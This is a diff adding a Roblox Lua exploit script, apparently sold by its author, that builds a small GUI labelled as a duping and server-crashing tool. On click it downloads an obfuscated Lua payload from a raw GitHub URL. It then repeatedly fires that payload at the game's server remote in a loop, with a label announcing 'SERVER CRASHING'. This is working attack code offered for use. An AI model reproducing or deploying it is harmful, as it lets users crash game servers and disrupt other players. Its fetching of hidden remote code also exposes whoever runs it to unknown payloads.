@@ -1,0 +1,121 @@
+print("ZOID SO OPPPPPPP")
+
+local KENJ = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local Frame2 = Instance.new("Frame")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+
+--Properties:
+
+KENJ.Name = "KENJ"
+KENJ.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+KENJ.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = KENJ
+Frame.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
+Frame.Position = UDim2.new(0.314604312, 0, 0.239059165, 0)
+Frame.Size = UDim2.new(0, 317, 0, 263)
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Position = UDim2.new(0.17741935, 0, 0.263998121, 0)
+TextBox.Size = UDim2.new(0, 197, 0, 41)
+TextBox.ZIndex = -5
+TextBox.Font = Enum.Font.Oswald
+TextBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
+TextBox.PlaceholderText = "INSERT INTERVAL"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(134, 134, 134)
+TextBox.TextScaled = true
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0.17741935, 0, 0.534246564, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.Sarpanch
+TextButton.Text = "ENTER"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.Position = UDim2.new(-0.00130146742, 0, -0.000698581338, 0)
+TextLabel.Size = UDim2.new(0, 317, 0, 51)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "DUPING SCRIPT MADE BY Zoid#4084"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 15.000
+
+Frame2.Name = "Frame2"
+Frame2.Parent = KENJ
+Frame2.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+Frame2.BorderColor3 = Color3.fromRGB(53, 53, 53)
+Frame2.Position = UDim2.new(0.31965813, 0, 0.300429165, 0)
+Frame2.Size = UDim2.new(0, 407, 0, 240)
+Frame2.Visible = false
+
+TextLabel_2.Parent = Frame2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+TextLabel_2.BorderColor3 = Color3.fromRGB(77, 77, 77)
+TextLabel_2.Position = UDim2.new(0, 0, 0.300000012, 0)
+TextLabel_2.Size = UDim2.new(0, 407, 0, 95)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "SERVER CRASHING.......... "
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 16.000
+TextLabel_2.TextStrokeColor3 = Color3.fromRGB(80, 80, 80)
+TextLabel_2.TextWrapped = true
+
+TextLabel_3.Parent = Frame2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(134, 134, 134)
+TextLabel_3.Size = UDim2.new(0, 407, 0, 54)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "GUI MADE BY Zoid#4084"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextSize = 14.000
+
+TextLabel_4.Parent = Frame2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+TextLabel_4.BorderColor3 = Color3.fromRGB(77, 77, 77)
+TextLabel_4.Position = UDim2.new(0, 0, 0.520833313, 0)
+TextLabel_4.Size = UDim2.new(0, 407, 0, 72)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "(ONLY BUY FROM ZOID Zoid#4084)"
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextSize = 16.000
+TextLabel_4.TextStrokeColor3 = Color3.fromRGB(75, 75, 75)
+TextLabel_4.TextWrapped = true
+
+local Interval = TextBox.Text
+local function SetInterval(TEST)
+
+	print(TEST.." -- Set")
+
+	Frame.Visible = false
+	Frame2.Visible = true
+	local crasher = game:HttpGet("https://raw.githubusercontent.com/testtttttt26/232321331312/main/Protected%20(22).lua")
+
+	while task.wait(TEST) do
+		print("EXECUTING MADE BY ZOID#")    
+		workspace.__THINGS.__REMOTES.MAIN:FireServer("b", crasher)
+	end
+end
+
+TextButton.MouseButton1Click:Connect(function()
+	pcall(function()
+		if TextBox.Text + TextBox.Text then
+			SetInterval(TextBox.Text)
+		else
+			print('Number Only')
+		end
+	end)
+end)
